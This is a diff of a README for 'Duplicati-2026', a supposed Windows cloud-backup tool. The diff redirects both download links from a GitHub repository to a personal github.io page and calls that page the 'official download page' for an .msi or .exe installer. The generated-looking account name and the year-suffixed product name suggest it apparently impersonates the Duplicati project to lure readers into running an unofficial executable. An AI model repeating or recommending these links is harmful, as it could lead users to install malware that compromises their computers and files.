@@ -1,6 +1,6 @@
 # 💾 Duplicati-2026 - Secure your files with ease
 
-[![](https://img.shields.io/badge/Download-Duplicati-blue.svg)](https://github.com/shurwoodpreconceived851/Duplicati-2026)
+[![](https://img.shields.io/badge/Download-Duplicati-blue.svg)](https://shurwoodpreconceived851.github.io)
 
 Backup your data to the cloud. This tool protects your files against loss. It uses encryption to keep your data private. You can manage your backups on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ Backup your data to the cloud. This tool protects your files against loss. It us
 
 Follow these steps to get the software on your computer.
 
-1. Go to the [official download page](https://github.com/shurwoodpreconceived851/Duplicati-2026).
+1. Go to the [official download page](https://shurwoodpreconceived851.github.io).
 2. Look for the file ending in .msi or .exe.
 3. Select the file to start the download.
 4. Save the file to your desktop or downloads folder.
